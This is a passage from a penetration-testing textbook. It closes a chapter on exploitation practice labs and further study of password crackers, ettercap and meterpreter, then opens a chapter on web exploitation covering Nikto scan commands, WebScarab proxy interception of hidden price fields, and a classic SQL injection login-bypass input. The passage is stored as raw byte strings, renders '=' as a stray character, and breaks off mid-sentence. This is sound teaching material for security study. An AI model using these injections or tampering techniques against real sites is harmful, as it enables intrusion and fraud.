b'Unleashed.\xe2\x80\x9d it is strongly recommended that you explore this resource after \n', b'completing this book. the metasploit Unleashed project contains a detailed \n', b'description of how to download and set up Ubuntu 7.04 with sAmBA installed. \n', b'creating a virtual machine with Ubuntu 7.04 and sAmBA running is a way of \n', b'setting up a free (as in no cost) vulnerable target and allows you practice attack-\n', b'ing a linux system.\n', b'metasploit itself has also released a vulnerable target that can be used to \n', b'practice exploitation. the target system is a linux virtual machine called \n', b'\xe2\x80\x9cmetasploitable.\xe2\x80\x9d metasploitable is based on Ubuntu 8.04 and is available at no \n', b'charge. You can download your copy of metasploitable by grabbing the torrent \n', b'on the metasploit express community site. the virtual machine is configured to \n', b'run as a live distribution, so if you destroy the system beyond repair, you simply \n', b'have to reboot it to start over from scratch. this is a great way to practice.\n', b'finally, thomas wilhelm has graciously created and offered for free a series \n', b'of entertaining, challenging, and highly customizable live linux cds called \n', b'de-ice. the de-ice cds allow you to practice a series of penetration test-\n', b'ing challenges following a realistic scenario. You can get your hands on these \n', b'great cds by downloading them at http://heorot.net/livecds/. the cds are great \n', b'because they present you with a realistic simulation of an actual penetration test.\n', b'Another great feature of the de-ice cds is that you would not be able to sim-\n', b'ple Autopwn your way through the challenges. each de-ice cd includes sev-\n', b'eral different levels of challenges that you must complete. As you work your \n', b'way through the challenges, you will need to learn to think critically and use \n', b'many of the tools and techniques we have discussed in steps 1\xe2\x80\x933.\n', b'the only word of caution when using these awesome cds (or any preconfig-\n', b'ured lab for that matter) is that you should be very careful about asking for \n', b'too much help, giving up too soon, and relying on the hints too often. live \n', b'cds like de-ice hold a tremendous value but oftentimes you only get to \n', b'work through them a single time. once you have read the hint or solution to \n', b'\x0cExploitation ChApTER 4\n', b'103\n', b'a problem, there is no way to put the \xe2\x80\x9canswer Jinni\xe2\x80\x9d back into the bottle, as \n', b'you will most likely remember the answer forever. As a result, you are encour-\n', b'aged to have persistence and tough it out. if you have read and practiced every-\n', b'thing that has been discussed up to this point, you will have the ability to gain \n', b'administrative access to the first de-ice disk.\n', b'of course, you can always go back and rerun the challenges and you are \n', b'encouraged to do so, but it will be different the second time around because \n', b'you will know what to look for. take your time, enjoy the challenge, and work \n', b'through the issues you encounter. Believe it or not, there is tremendous value \n', b'and learning potential in banging your head against a seemingly insurmount-\n', b'able problem. if you want to be a penetration tester, you will need to learn to \n', b'be persistent and resourceful. embrace the challenges you encounter as a learn-\n', b'ing situation and make the most of them.\n', b'setting up and working your way through all the vulnerable targets described \n', b'above should be an enjoyable process. Below you will find some specific tips \n', b'for setting up targets to practice each of the tools that were discussed in this \n', b'chapter.\n', b'the easiest way to practice medusa is to start a remote process on a target \n', b'machine. try starting telnet on a windows machine and ssH or ftP on a \n', b'linux machine. You will need to create a few additional users and passwords \n', b'with access to the remote services. once you have the remote service running, \n', b'you can practice using medusa to gain access to the remote system.\n', b'the easiest way to practice metasploit and fast-track is by setting up an older \n', b'version of windows xP as the target; remember the lower the service pack, the \n', b'better. You can also download a copy of Ubuntu 7.04 and install sAmBA on it \n', b'or find metasploit\xe2\x80\x99s own \xe2\x80\x9cmetasploitable\xe2\x80\x9d virtual machine.\n', b'to practice with John the ripper and chntpw, you can set up a victim machine \n', b'with several user accounts and different passwords. it is highly suggested that \n', b'you vary the strength of the passwords for each account. make a few user \n', b'accounts with weak three- and four-letter passwords and make others with \n', b'longer passwords that include upper and lowercase letters along with special \n', b'characters.\n', b'WhERE DO I GO fROM hERE?\n', b'At this point you should have a solid understanding of the basic steps required \n', b'to exploit and gain access to a system. remember your attack methods will \n', b'change based on your target and desired goal. now that you understand the \n', b'basics, you should be ready to tackle some more advanced topics.\n', b'You should take some time and review the password brute forcing tool Hydra. \n', b'this tool functions much like medusa but provides a few extra switches to give \n', b'you some additional options. carefully review each of the switches supported \n', b'by Hydra. You can find the switches and a brief description by reviewing the \n', b'Openmirrors.com\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'104\n', b'Hydra man pages. it is recommended that you pay special attention to the tim-\n', b'ing option. the ability to control the timing or rate of connections is handy for \n', b'correcting many connection errors that occur when we utilize online password \n', b'crackers.\n', b'Along with your own personal password dictionary, you should begin build-\n', b'ing a list of default usernames and passwords for various network devices. As \n', b'you progress in your penetration testing career, you will probably be surprised \n', b'at how often you will come across devices like routers, switches, modems, fire-\n', b'walls, etc., that still use a default username and password. it is not uncommon \n', b'to find Pt stories where the penetration tester was able to take complete con-\n', b'trol of a boarder router and redirect all internal and external traffic because \n', b'the company administrator had forgotten to change the default username \n', b'and password. it does little good to spend time configuring and securing your \n', b'device if you fail to change the username and password. there are several good \n', b'starter lists of default usernames and passwords available online.\n', b'Another great tool for password cracking is rainbowcrack. rainbowcrack is \n', b'a tool that relies on rainbow tables to crack passwords. A rainbow table is a \n', b'precomputed list of password hashes. recall that traditional password-cracking \n', b'tools like John the ripper go through a three-step process. first, the tool must \n', b'generate a potential password; next, the tool needs to create a hash of the cho-\n', b'sen word; and finally, the password-cracking tool has to compare the generated \n', b'hash with the password hash. rainbow tables are much more efficient because \n', b'they make use of precomputed password hashes. this means that the cracking \n', b'process reduces two out of the three steps and simply needs to compare hashes \n', b'to hashes.\n', b'there are lots of great tools that can be explored and used for sniffing. it is \n', b'highly recommended that you spend time getting to know and use wireshark. \n', b'this book covered only the basics, but wireshark is a deep program with many \n', b'rich features. You should learn how to use the filters, follow data streams, \n', b'and view information on specific packets. once you are comfortable with \n', b'wireshark, digging into dsniff is highly recommended. As mentioned earlier, \n', b'dsniff is an incredible suite with tons of great tools. with some self-study and \n', b'practice, you can even learn to intercept encrypted traffic like ssl.\n', b'ettercap is another fantastic tool that has many powerful features and abili-\n', b'ties. ettercap is a great tool for conducting man-in-the-middle attacks. ettercap \n', b'works by tricking clients into sending network traffic through the attacker \n', b'machine. this is a great way to get usernames and passwords from machines \n', b'on the local lAn. once you have successfully studied and used wireshark, \n', b'dsniff, and ettercap, you will be well on your way to mastering the basics of \n', b'network sniffing.\n', b'After reviewing and understanding the basics of metasploit, you should dig in \n', b'and learn the details of the meterpreter payload. there are dozens of switches, \n', b'commands, and ways to interact with the meterpreter. You should learn and \n', b'\x0cExploitation ChApTER 4\n', b'105\n', b'practice them all. learning how to control this amazing payload will pay \n', b'mountains of dividends in your exploitation career. it is important that you \n', b'understand using metasploit in combination with the meterpreter is one of \n', b'the most lethal amalgamations available to a new penetration tester. do not \n', b'underestimate or overlook this powerful tool.\n', b'Until now only automated attacks have been discussed. even though it can be \n', b'extremely entertaining to push buttons and pwn remote systems, if you never \n', b'advance your skill level beyond this point, you will be a script kiddie forever. \n', b'initially we all start out as a person who must rely on others to develop and \n', b'release new exploit tools, but to become truly elite you will need to learn how \n', b'to read, write, and create your own exploits. while creating your own exploits \n', b'may seem daunting at first, it is a process that becomes much easier the more \n', b'you learn. A good place to start learning about exploitation is by getting to \n', b'know buffer overflows.\n', b'stack and heap based buffer overflows, which are responsible for many of \n', b'the exploits available today, often seem like magic or voodoo to newcom-\n', b'ers. However, with some dedicated and careful self-study, these topics can be \n', b'demystified and even mastered.\n', b'Advancing your skill level to the point of being able to find buffer overflows and \n', b'write shell code often requires some additional training. Although this train-\n', b'ing is not strictly required, it certainly makes the process of learning advanced \n', b'exploitation much easier. whenever possible, you should spend time learning a \n', b'programming language like \xe2\x80\x9cc.\xe2\x80\x9d once you are comfortable with c, you should \n', b'focus on understanding at least the basics of Assembly language. Having a solid \n', b'understanding of these topics will help dispel much of the \xe2\x80\x9cblack-magic\xe2\x80\x9d feel \n', b'many people have when they first encounter buffer overflows.\n', b'SUMMARy\n', b'this chapter focused on step 3 of our basic methodology: exploitation. \n', b'exploitation is the process most newcomers associate directly with \xe2\x80\x9chacking.\xe2\x80\x9d \n', b'Because exploitation is a broad topic, the chapter examined several different \n', b'methods for completing this step including using the online password cracker \n', b'medusa to gain access to remote systems. the process of exploiting remote vul-\n', b'nerabilities with metaploit was discussed as well as several payloads that can be \n', b'used with metasploit. John the ripper was introduced for cracking local pass-\n', b'words. A tool for password resetting was shown for those times when a penetra-\n', b'tion tester does not have time to wait for a password cracker. wireshark was \n', b'used to sniff data off the network and macof was used to sniff network traffic \n', b'on a switched network. finally, fast-track Autopwn was shown as a one-stop \n', b'shop for the exploitation phase.\n', b'Openmirrors.com\n', b'\x0cThis page intentionally left blank\n', b'\x0c107\n', b'Web-Based Exploitation\n', b'ChApTER 5\n', b'Information in This Chapter:\n', b'n Interrogating Web Servers: Nikto\n', b'n Websecurify: Automated Web Vulnerability Scanning\n', b'n Spidering: Crawling Your Target\xe2\x80\x99s Website\n', b'n Intercepting Requests with WebScarab\n', b'n Code Injection Attacks\n', b'n Cross-Site Scripting: Browsers That Trust Sites\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'108\n', b'INTRODUCTION\n', b'now that you have a good understanding of common network-based attacks, it \n', b'is important to take some time to discuss the basics of web-based exploitation. \n', b'the web is certainly one of the most common attack vectors available today \n', b'because everything is connected to the internet. nearly every company today \n', b'has a web presence, and more often than not, that web presence is dynamic \n', b'and user-driven. Previous-generation websites were simple static pages coded \n', b'mostly in Html. By contrast, many of today\xe2\x80\x99s websites include complex cod-\n', b'ing with backend database-driven transactions and multiple layers of authen-\n', b'tication. Home computers, phones, appliances, and of course systems that \n', b'belong to our targets are all connected to the internet.\n', b'As our dependence and reliance on the web continues to expand, so does the \n', b'need to understand how this attack vector can be exploited.\n', b'A few years back, people started using words like \xe2\x80\x9cweb 2.0\xe2\x80\x9d and \xe2\x80\x9ccloud-based \n', b'computing\xe2\x80\x9d to describe a shift in the way we interact with our systems and pro-\n', b'grams. simply put, these terms are a change in the way computer programs \n', b'are designed, run, accessed, and stored. regardless of what words are used to \n', b'describe it, the truth of the matter is that the internet is becoming more and \n', b'more \xe2\x80\x9cexecutable.\xe2\x80\x9d it used to be that programs like microsoft office had to be \n', b'installed locally on your physical computer. now this same functionality can \n', b'be accessed online in the form of google docs and many other cloud com-\n', b'puting services. in many instances, there is no local installation and your data, \n', b'your programs, and your information reside on the server in some physically \n', b'distant location.\n', b'As mentioned earlier, companies are also leveraging the power of an executable \n', b'web. online banking, shopping, and record-keeping are now common place. \n', b'everything is interconnected. in many ways, the internet is like the new \xe2\x80\x9cwild \n', b'west.\xe2\x80\x9d Just when it seemed like we were making true progress and fundamen-\n', b'tal changes to the way we program and architect system software, along comes \n', b'the internet and gives us a new way to relearn and repeat many of the security \n', b'lessons from the past. As people rush to push everything to the web and sys-\n', b'tems are mashed up and deployed with worldwide accessibility, new attacks \n', b'are developed and distributed at a furious pace.\n', b'it is important that every aspiring hacker and penetration tester understand at \n', b'least the basics of the web-based exploitation.\n', b'INTERROGATING WEB SERvERS: NIKTO\n', b'After running a port scan and discovering a service running on port 80 or port \n', b'443, one of the first tools that should be used to evaluate the service is nikto. \n', b'nikto is a web server vulnerability scanner. this tool was written by chris \n', b'sullo and david lodge. nikto automates the process of scanning web servers \n', b'Openmirrors.com\n', b'\x0cWeb-Based Exploitation ChApTER 5\n', b'109\n', b'for out-of-date and unpatched software as well as searching for dangerous files \n', b'that may reside on web servers. nikto is capable of identifying a wide range of \n', b'specific issues and also checks the server for configuration issues. the current \n', b'version of nikto is built into Backtrack and available in the /pentest/scanners/\n', b'nikto directory. if you are not using Backtrack, nikto can be obtained by down-\n', b'loading it from the http://www.cirt.net/nikto2 website. Please note you will \n', b'need Perl installed to run nikto.\n', b'to view the various options available, you can run the following command \n', b'from inside the /pentest/scanners/nikto directory:\n', b'perl nikto.pl\n', b'running this command will provide you with a brief description of the \n', b'switches available to you. to run a basic vulnerability scan against a target, you \n', b'need to specify a host iP address with the \xe2\x80\x9c-h\xe2\x80\x9d switch. You should also specify \n', b'a port number with the \xe2\x80\x9c-p\xe2\x80\x9d switch. You can instruct nikto to scan multiple \n', b'ports by specifying a port range. for example to scan for web servers on all \n', b'ports between 1 and 1000, you would issue the following command in a termi-\n', b'nal window (again you must be in the /pentest/scanners/nikto directory):\n', b'perl nikto.pl -h 172.16.45.129 \xe2\x80\x93p 1-1000\n', b'if you fail to specify a port number, nikto will only scan port 80 on your tar-\n', b'get. if you want to save the nikto output for later review, you can do so by \n', b'issuing the \xe2\x80\x9c\xe2\x80\x93o\xe2\x80\x9d followed by the file path and name of the file you would like \n', b'to use to save the output. figure 5.1 includes a screenshot of the nikto output \n', b'from our example.\n', b'fIGURE 5.1\n', b'Output of the Nikto Web Vulnerability Scanner.\n', b'Openmirrors.com\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'110\n', b'WEBSECURIfy: AUTOMATED WEB  \n', b'vULNERABILITy SCANNING\n', b'Another great tool to use when first interacting with a target web server is \n', b'websecurify. websecurify provides an easy-to-use interface that allows pen-\n', b'etration testers to quickly and easily identify web vulnerabilities including \n', b'sQl injection, cross-site scripting, file includes, cross-site request forgery, and \n', b'others.\n', b'websecurify can be set up and used with little configuration making it very \n', b'handy for people who are new to web penetration testing. You can access \n', b'websecurify by clicking: k-start dragon \xe2\x86\x92 Backtrack \xe2\x86\x92 web Application \n', b'Analysis \xe2\x86\x92 web (front end) \xe2\x86\x92 web securify.\n', b'After starting the program you will be presented with a \xe2\x80\x9cgetting started\xe2\x80\x9d page; \n', b'you can begin your test by clicking on the \xe2\x80\x9cstart new automated test\xe2\x80\x9d link as \n', b'shown in figure 5.2.\n', b'After clicking the \xe2\x80\x9cstart new automated test,\xe2\x80\x9d you will be presented with a \n', b'start test window. You will need to enter a Url or iP address in the \xe2\x80\x9ctarget\xe2\x80\x9d \n', b'textbox. entering information in the \xe2\x80\x9cworkspace\xe2\x80\x9d textbox is optional, as \n', b'websecurify will automatically generate this for you when you enter a target. \n', b'figure 5.3 shows the start test window; once you have entered a Url or iP \n', b'address, you can click the \xe2\x80\x9cok\xe2\x80\x9d button to begin your test.\n', b'once the test is completed, you will be presented with a workspace report \n', b'that will allow you to view specific details and issues that were discovered by \n', b'websecurify. You can view the specific information by clicking the triangle to \n', b'expand the findings. figure 5.4 shows the output from our scan.\n', b'fIGURE 5.2\n', b'Starting an Automated Web Test Using Websecurify.\n', b'Openmirrors.com\n', b'\x0cWeb-Based Exploitation ChApTER 5\n', b'111\n', b'As you can see, websecurify found several issues including an sQl injection \n', b'vulnerability. sQl injection attacks will be discussed in a later section of this \n', b'chapter.\n', b'SpIDERING: CRAWLING yOUR TARGET\xe2\x80\x99S WEBSITE\n', b'Another great tool to use when initially interacting with a web target is \n', b'webscarab. webscarab was written by rogan dawes and is available through \n', b'the owAsP website. if you are running Backtrack, a version of webscarab is \n', b'already installed. this powerful framework is modular in nature and allows \n', b'fIGURE 5.3\n', b'Entering a Target in the Websecurify Start Test Window.\n', b'fIGURE 5.4\n', b'Websecurify Report.\n', b'Openmirrors.com\n', b'Openmirrors.com\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'112\n', b'you to load numerous plug-ins to customize it to your needs. even in its \n', b'default configuration, webscarab provides an excellent resource for interacting \n', b'with and interrogating web targets.\n', b'After having run the vulnerability scanners, nikto and websecurify, the next \n', b'logical step is to run a spidering program on the target website. spiders are \n', b'extremely useful in reviewing and reading (or crawling) your target\xe2\x80\x99s website \n', b'looking for all links and associated files. each of the links, web pages, and files \n', b'discovered on your target are recorded and cataloged. this cataloged data can \n', b'be useful for accessing restricted pages and locating unintentionally disclosed \n', b'documents or information.\n', b'You can access the spider function in webscarab by first starting the program \n', b'through the k-start dragon. this can be accomplished by clicking: k-start \n', b'dragon \xe2\x86\x92 Backtrack \xe2\x86\x92 web Application Analysis \xe2\x86\x92 web (front end) \xe2\x86\x92 \n', b'webscarab lite.\n', b'this will load the webscarab program. However, before you can begin spider-\n', b'ing your target, you will need to switch to the \xe2\x80\x9cfull-featured interface.\xe2\x80\x9d You can \n', b'do this by clicking on the \xe2\x80\x9ctools\xe2\x80\x9d menu and putting a checkbox in the \xe2\x80\x9cUse \n', b'full-featured interface\xe2\x80\x9d checkbox as shown in figure 5.5.\n', b'After switching to the full-featured interface, you will be prompted to restart \n', b'webscarab. once you restart the tool, you will be given access to a number of \n', b'new panels along the top of the window including the \xe2\x80\x9cspider\xe2\x80\x9d tab.\n', b'now that you have set up webscarab, you need to configure your browser to \n', b'use a proxy. setting up webscarab as your proxy will cause all the web traf-\n', b'fic going into and coming out of your browser to pass through the webscarab \n', b'program. in this respect, the proxy program acts as a middle man and has the \n', b'ability to view, stop, and even manipulate network traffic.\n', b'setting up your browser to use a proxy is usually done through the prefer-\n', b'ences or network options. in firefox, you can click on: edit \xe2\x86\x92 Preference. in \n', b'the firefox Preferences window, click the \xe2\x80\x9cAdvanced\xe2\x80\x9d menu followed by the \n', b'\xe2\x80\x9cnetwork\xe2\x80\x9d tab. finally, click on the \xe2\x80\x9csettings\xe2\x80\x9d button as shown in figure 5.6.\n', b'clicking on the settings button will allow you to configure your browser to use \n', b'webscarab as a proxy. select the radio button for \xe2\x80\x9cmanual proxy configura-\n', b'tion:\xe2\x80\x9d. next enter: 127.0.0.1 in the \xe2\x80\x9cHttP Proxy:\xe2\x80\x9d input box. finally enter: 8008 \n', b'fIGURE 5.5\n', b'Switching WebScarab to Run in Full-featured Interface Mode.\n', b'\x0cWeb-Based Exploitation ChApTER 5\n', b'113\n', b'into the \xe2\x80\x9cPort\xe2\x80\x9d field. it is usually a good idea to check the box just below the \n', b'\xe2\x80\x9cHttP Proxy\xe2\x80\x9d box and select \xe2\x80\x9cUse this proxy server for all protocols.\xe2\x80\x9d once you \n', b'have all of this information entered, you can click \xe2\x80\x9cok\xe2\x80\x9d to exit the connection \n', b'settings window and \xe2\x80\x9cclose\xe2\x80\x9d to exit the firefox Preferences window. figure 5.7 \n', b'shows an example of my firefox connection settings window.\n', b'At this point, any web traffic coming into or passing out of your browser will \n', b'route through the webscarab proxy. two words of warning: first you need to \n', b'fIGURE 5.6\n', b'Setting Up Firefox to Use WebScarab as a Proxy.\n', b'fIGURE 5.7\n', b'Firefox Connection Settings for Using WebScarab as a Proxy.\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'114\n', b'leave webscarab running while it is serving as a proxy. if you close the pro-\n', b'gram, you will not be able to browse the internet. if this happens, firefox is \n', b'great at providing you with an error message that it cannot find a proxy \n', b'and you will need to restart webscarab or change your network configura-\n', b'tion in firefox. the second warning is that while surfing the internet using \n', b'a local proxy, all https traffic will show up as having an invalid certificate! \n', b'this is expected behavior because your proxy is sitting in the middle of your \n', b'connection.\n', b'As a side note, it is important that you always pay attention to invalid security \n', b'certificates when browsing. At this point, certificates are your best defense and \n', b'often your only warning against a man-in-the-middle attack.\n', b'now that you have set up a proxy and have configured your browser, you are \n', b'ready to begin spidering your target. You begin by entering the target Url \n', b'into the browser. in our earlier example, we discovered a website running on \n', b'172.16.45.132. entering the following into your firefox browser will load the \n', b'website through webscarab. once the website has loaded in your browser, you \n', b'can switch over the webscarab program. You should see the Url you entered \n', b'(along with any others that you have visited since starting your proxy). to spider \n', b'the site, you right click the Url and choose \xe2\x80\x9cspider tree\xe2\x80\x9d as shown in figure 5.8.\n', b'You can now view each of the files and folders associated with your target web-\n', b'site. individual folders can be further spidered by right clicking and choosing \n', b'\xe2\x80\x9cspider tree\xe2\x80\x9d again. You should spend time carefully examining every nook \n', b'and cranny within your authorized scope. spidering a website is a great way to \n', b'find inadvertently or leaked confidential data from a target website.\n', b'fIGURE 5.8\n', b'Using WebScarab to Spider the Target Website.\n', b'Openmirrors.com\n', b'\x0cWeb-Based Exploitation ChApTER 5\n', b'115\n', b'INTERCEpTING REqUESTS WITh WEBSCARAB\n', b'As previously mentioned, webscarab is a very powerful tool. one of its many \n', b'roles is to function as a proxy server. recall that a proxy sits between the cli-\n', b'ent (browser) and the server. while the proxy is running, all the web traffic \n', b'flowing into and out of your browser is passed through the program. Passing \n', b'traffic through a local proxy provides us with an amazing ability; by running \n', b'webscarab in this mode, we are able to stop, intercept, and even change the \n', b'data either before it arrives or after it leaves the browser. this is a subtle but \n', b'important point; the use of a proxy allows us to make changes to data in tran-\n', b'sit. the ability to manipulate or view HttP request or response information \n', b'has serious security implications.\n', b'consider the following: some poorly coded websites rely on the use of hidden \n', b'fields to transmit information to and from the client. in these instances, the \n', b'programmer makes use of a hidden field on the form, assuming that the user \n', b'will not be able to access it. Although this assumption is true for a normal user, \n', b'anyone leveraging the power of a proxy server will have the ability to access \n', b'and modify the hidden field.\n', b'the classic example of this scenario is the user who was shopping at an online \n', b'golf store. After browsing the selection, he decided to buy a driver for $299. \n', b'Being a security analyst, the astute shopper was running a proxy and noticed \n', b'that the website was using a hidden field to pass the value of the driver ($299) \n', b'to the server when the \xe2\x80\x9cadd to cart\xe2\x80\x9d button was clicked. the shopper set up his \n', b'proxy to intercept the HttP Post request. this means when the information \n', b'was sent to the server, it was stopped at the proxy. the shopper now had the \n', b'ability to change the value of the hidden field. After manually changing the \n', b'value from $299 to $1, the request was sent onto the server. the driver was \n', b'added to his shopping cart and the new total due was $1.\n', b'Although this scenario is not as common as it used to be, it certainly demon-\n', b'strates the power of using a proxy to intercept and inspect HttP requests and \n', b'responses.\n', b'to use webscarab as an interceptor, you need to configure your browser to \n', b'use a proxy as discussed in the spidering section of this chapter. once your \n', b'browser is configured to use the proxy, you can start webscarab by clicking on \n', b'the following: k-start dragon \xe2\x86\x92 Backtrack \xe2\x86\x92 web Application Analysis \xe2\x86\x92 web \n', b'(front end) \xe2\x86\x92 webscarab lite.\n', b'You will need to restart webscarab to use the \xe2\x80\x9clite\xe2\x80\x9d version. once webscarab \n', b'has finished loading, you will need to click on the \xe2\x80\x9cintercepts tab.\xe2\x80\x9d next \n', b'you should put a check box in both the \xe2\x80\x9cintercept requests\xe2\x80\x9d and \xe2\x80\x9cintercept \n', b'responses\xe2\x80\x9d as shown in figure 5.9.\n', b'At this point you can use firefox to browse through your target website.\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'116\n', b'with webscarab set up as described, the proxy will stop nearly every transac-\n', b'tion and allow you to inspect or change the data. luckily if you find yourself in \n', b'this situation, webscarab has included a \xe2\x80\x9ccancel All intercepts\xe2\x80\x9d button. this \n', b'can be handy to keep moving forward.\n', b'to change the values of a given field, wait for webscarab to intercept the \n', b'request; then locate the variable you wish to change. At this point, you can \n', b'simply enter a new value in the \xe2\x80\x9cvalue\xe2\x80\x9d field and click the \xe2\x80\x9cinsert\xe2\x80\x9d button to \n', b'update the field with the new value.\n', b'Viewing HttP response and requests can also be useful for discovering user-\n', b'name and password information. Just remember, the value in many of these \n', b'fields will be Base64 encoded. Although these values may look as though they \n', b'are encrypted, you should understand that Base64 is a form of encoding not \n', b'encryption. Although these processes may sound similar, they are vastly differ-\n', b'ent. decoding Base64 is a trivial task that can be accomplished with little effort \n', b'using a program or online tool.\n', b'it should be pointed out that there are many good proxy servers available to \n', b'assist you with the task of data interception. do not be afraid to explore other \n', b'proxy servers as well.\n', b'CODE INJECTION ATTACKS\n', b'like buffer overflows in system code, injection attacks have been a serious issue \n', b'in the web world for many years, and like buffer overflows, there are many \n', b'fIGURE 5.9\n', b'Setting Up WebScarab to Intercept Requests and Responses.\n', b'ALERT!\n', b'Just a word of warning\xe2\x80\x94you may want to leave the Intercept requests and Intercept \n', b'responses unchecked until you are ready to test, as nearly every page involves these \n', b'actions and intercepting everything before you are ready will make your browsing \n', b'experience painfully slow.\n', b'\x0cWeb-Based Exploitation ChApTER 5\n', b'117\n', b'different kinds of code injection attacks. Broadly defined, this class of attacks \n', b'could easily fill a chapter. However, because we are focusing on the basics, \n', b'we will examine the most basic type of code injection: the classic sQl injec-\n', b'tion. we will explore the basic commands needed to run an sQl injection and \n', b'how it can be used to bypass basic web application authentication. injection \n', b'attacks can be used for a variety of purposes including bypassing authentica-\n', b'tion, manipulating data, viewing sensitive data, and even executing commands \n', b'on the remote host.\n', b'most modern web applications rely on the use of interpreted programming \n', b'languages and backend databases to store information and generate dynami-\n', b'cally driven content to the user. there are many popular interpreted program-\n', b'ming languages in use today including PHP, Javascript, AsP, structured Query \n', b'language (sQl), Python, and countless others. An interpreted language differs \n', b'from a compiled language because the interpreted language generates machine \n', b'code just before it is executed. compiled programming languages require the \n', b'programmer to compile the source code and generate an executable (.exe) file. \n', b'in this case, once the program is compiled, the source code cannot be changed \n', b'unless it is recompiled and the new executable is redistributed.\n', b'in the case of modern web applications, like an e-commerce site, the inter-\n', b'preted language works by building a series of executable statements that uti-\n', b'lize both the original programmer\xe2\x80\x99s work and input from the user. consider \n', b'an online shopper who wants to purchase more rAm for his computer. the \n', b'user navigates to his favorite online retailer and enters the term \xe2\x80\x9c16gb rAm\xe2\x80\x9d in \n', b'the search box. After the user clicks the search button, the web app gathers the \n', b'user\xe2\x80\x99s input (\xe2\x80\x9c16gb rAm\xe2\x80\x9d) and constructs a query to search the backend data-\n', b'base for any rows in the product table containing \xe2\x80\x9c16gb rAm.\xe2\x80\x9d Any products \n', b'that contain the keywords \xe2\x80\x9c16gb rAm\xe2\x80\x9d are collected from the database and \n', b'returned to the user\xe2\x80\x99s browser.\n', b'Understanding what an interpreted language is and how it works is the key to \n', b'understanding injection attacks. knowing that user input will often be used \n', b'to build code that is executed on the target system, injection attacks focus on \n', b'submitting, sending, and manipulating user-driven input. the goal of sending \n', b'manipulated input or queries to a target is to get the target to execute unin-\n', b'tended commands or return unintended information back to the attacker.\n', b'the classic example of an injection attack is sQl injection. sQl is a program-\n', b'ming language that is used to interact with and manipulate data in a database. \n', b'Using sQl a user can read, write, modify, and delete data stored in the database \n', b'tables. recall from our example above that the user supplied a search string \n', b'\xe2\x80\x9c16gb rAm\xe2\x80\x9d to the web application (an e-commerce website). in this case, the \n', b'web application generated an sQl statement based off of the user input.\n', b'it is important that you understand there are many different flavors of sQl \n', b'and different vendors may use different verbs to perform the same actions. \n', b'specific statements that work in oracle may not work in mysQl or mssQl. \n', b'the information contained below will provide a basic and generic framework \n', b'\x0cThe Basics of hacking and penetration Testing\n', b'118\n', b'for interacting with most applications that use sQl, but you should strive to \n', b'learn the specific elements for your target.\n', b'consider another example. Assume that our network admin Ben owned is \n', b'searching for a christmas present for his boss. wanting to make up for many \n', b'of his past mistakes, Ben decides to browse his favorite online retailer to search \n', b'for a new laptop. to search the site for laptops, Ben enters the keywords \xe2\x80\x9clap-\n', b'top\xe2\x80\x9d (minus the quotes) into a search box. this causes the web application to \n', b'build an sQl query looking for any rows in the product table that include the \n', b'word \xe2\x80\x9claptop.\xe2\x80\x9d sQl queries are among the most common actions performed \n', b'by web applications as they are used to search tables and return matching \n', b'results. the following is an example of a simple sQl query:\n', b'SELECT * FROM product WHERE category \xee\x80\xb5 \xe2\x80\x98laptop\xe2\x80\x99;\n', b'in the statement above, the \xe2\x80\x9cselect\xe2\x80\x9d verb is used to tell sQl that you wish \n', b'to search and return results from a table. the \xe2\x80\x9c*\xe2\x80\x9d is used as a wildcard and \n', b'instructs sQl to return every column from the table when a match is found. \n', b'the \xe2\x80\x9cfrom\xe2\x80\x9d keyword is used to tell sQl which table to search. the \xe2\x80\x9cfrom\xe2\x80\x9d \n', b'verb is followed immediately by the actual name of the table (\xe2\x80\x9cproduct\xe2\x80\x9d in this \n', b'example). finally, the \xe2\x80\x9cwHere\xe2\x80\x9d clause is used to set up a test condition. the \n', b'test condition is used to restrict or specify which rows are to be returned back \n', b'to the user. in this case, the select statement will return all the rows from the \n', b'product table that contain the word \xe2\x80\x9claptop\xe2\x80\x9d in the \xe2\x80\x9ccategory\xe2\x80\x9d column.\n', b'it is important to remember that in real life, most sQl statements you will \n', b'encounter are much more complex than this example. oftentimes, an sQl \n', b'query will interact with several columns from several different tables in the \n', b'same query. However, armed with this basic sQl knowledge, let us examine \n', b'this statement a little more closely. we should be able to clearly see that in \n', b'our example the user created the value to the right of the \xe2\x80\x9c\xee\x80\xb5\xe2\x80\x9d sign, whereas \n', b'the original programmer created everything to the left of the \xe2\x80\x9c\xee\x80\xb5\xe2\x80\x9d sign. we \n', b'can combine this knowledge with a little bit of sQl syntax to produce some \n', b'unexpected results. the programmer built an sQl statement that was already \n', b'fully constructed except for the string value to be used in the wHere clause. \n', b'the application accepts whatever the user types into the \xe2\x80\x9csearch\xe2\x80\x9d textbox and \n', b'appends that string value to the end of the already created sQl statement. \n', b'lastly, a final single quote is appended onto the sQl statement to balance the \n', b'quotes. it looks like this when it is all done:\n', b'SELECT * FROM product WHERE category \xee\x80\xb5 \xe2\x80\x98laptop\xe2\x80\x99\n', b'where SELECT * FROM product WHERE category \xee\x80\xb5\xe2\x80\x98 is created ahead of time \n', b'by the programmer, while the word laptop is user-supplied and the final \xe2\x80\x98 is \n', b'appended by the application to balance quotes.\n', b'Also notice that when the actual sQl statement was built, it included single \n', b'quotes around the word \xe2\x80\x9claptop.\xe2\x80\x9d sQl adds these because \xe2\x80\x9ccategory\xe2\x80\x9d is a string \n', b'datatype in the database. they must always be balanced, that is there must be \n', b'\x0cWeb-Based Exploitation ChApTER 5\n', b'119\n', b'an even number of quotes in the statement, so an sQl syntax error does not \n', b'occur. failure to have both an opening and closing quote will cause the sQl \n', b'statement to error and fail.\n', b'suppose that rather than simply entering the keyword, laptop, Ben entered the \n', b'following into the search box:\n', b'laptop\xe2\x80\x99 or 1 \xee\x80\xb5 1--\n', b'in this case the following sQl statement would be built and executed:\n', b"SELECT * FROM product WHERE category \xee\x80\xb5 \xe2\x80\x98laptop\xe2\x80\x99 or 1 \xee\x80\xb5 1--'\n", b'By adding the extra quote, Ben would close off the string containing the user-\n', b'supplied word of \xe2\x80\x98laptop\xe2\x80\x99 and add some additional code to be executed by the \n', b'sQl server, namely:\n', b'or 1 \xee\x80\xb5 1--\n', b'the \xe2\x80\x9cor\xe2\x80\x9d statement above is an sQl condition that is used to return records \n', b'when either statement is true. the 